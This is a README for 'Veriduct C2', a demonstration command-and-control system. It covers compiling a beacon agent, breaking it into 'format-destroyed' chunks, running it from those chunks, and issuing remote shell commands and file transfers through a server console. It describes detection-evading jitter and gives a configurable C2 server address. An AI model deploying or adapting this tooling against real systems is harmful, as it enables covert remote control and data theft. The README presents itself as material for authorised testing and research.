# Veriduct C2 System

Demonstration command-and-control system showing operational capability of format-destroyed binaries.

## Overview

This C2 system proves that Veriduct-processed agents maintain full functionality:
- Network communication
- Command execution
- File operations
- Persistence mechanisms

## Components

### veriduct_agent.c
Lightweight C2 beacon written in C.

**Features:**
- HTTP/HTTPS beaconing
- Command execution
- File upload/download
- Jittered timing (anti-pattern detection)
- Cross-platform (Windows/Linux)

**Compilation:**

Windows (MSVC):
```cmd
cl.exe /O2 veriduct_agent.c /Fe:agent.exe ws2_32.lib wininet.lib
```

Windows (MinGW):
```bash
gcc -O2 -o agent.exe veriduct_agent.c -lws2_32 -lwininet
```

Linux:
```bash
gcc -O2 -o agent veriduct_agent.c -lcurl
```

### veriduct_c2_server.py
Minimal Python C2 server.

**Features:**
- HTTP listener
- Agent registration
- Command queuing
- Result collection
- Interactive shell

**Usage:**
```bash
python veriduct_c2_server.py
```

## Workflow

### 1. Start Server
```bash
python veriduct_c2_server.py
# [*] C2 Server listening on port 8443
# [*] Database: c2.db
# c2>
```

### 2. Compile Agent
```cmd
cl.exe /O2 veriduct_agent.c /Fe:agent.exe ws2_32.lib wininet.lib
```

### 3. Annihilate Agent
```bash
python src/veriduct_prime.py annihilate agent.exe chunks/ --ssm --verbose
```

### 4. Execute from Chunks
```bash
python src/veriduct_prime.py run chunks/veriduct_key.zst --verbose
```

### 5. Interact via C2 Shell
```
c2> agents
Active Agents:
  a1b2c3d4: {"hostname":"WORKSTATION","username":"user"} (last: 2025-12-15T12:00:00)

c2> use a1b2c3d4
[*] Using agent: a1b2c3d4

[a1b2c3d4]> cmd shell whoami
[+] Command queued: shell whoami

[a1b2c3d4]> results
Recent Results:
  [2025-12-15T12:00:05] shell whoami
    Result: WORKSTATION\user
```

## C2 Commands

| Command | Description |
|---------|-------------|
| `shell <cmd>` | Execute shell command |
| `sleep <seconds>` | Change beacon interval |
| `download <path>` | Download file from C2 |
| `upload <path>` | Upload file to C2 |
| `exit` | Terminate agent |

## Server Commands

| Command | Description |
|---------|-------------|
| `agents` | List registered agents |
| `use <id>` | Select agent |
| `cmd <command>` | Queue command |
| `results` | View command results |
| `exit` | Shutdown server |

## Configuration

Edit `veriduct_agent.c` before compilation:

```c
#define C2_SERVER "https://your-c2-server.com"
#define C2_PORT 8443
#define BEACON_INTERVAL 60  // seconds
#define JITTER_PERCENT 20   // randomize timing
```

## Validation Results

The C2 agent was tested with Veriduct semantic execution:

| Metric | Value |
|--------|-------|
| Original size | 78 KB |
| Chunks created | 1,674 |
| DLLs loaded | 13 |
| Imports resolved | 77 |
| Network beacon | ✓ Working |
| Command execution | ✓ Working |
| File operations | ✓ Working |
| Crashes | 0 |

## Security Considerations

**This is a demonstration tool, not a production C2.**

Limitations:
- HTTP only (no certificate pinning)
- No encryption of payloads
- Basic authentication
- SQLite storage (not scalable)

For production use, implement:
- TLS with certificate validation
- Encrypted communications
- Proper key management
- Distributed infrastructure

## Legal Notice

This C2 system is provided for:
- Authorized penetration testing
- Security research
- Educational purposes

Users are responsible for legal compliance. Unauthorized access to computer systems is illegal.

## Files

```
c2/
├── README.md              # This file
├── veriduct_agent.c       # C2 beacon source
├── veriduct_c2_server.py  # C2 server
└── c2.db                  # SQLite database (created at runtime)
```
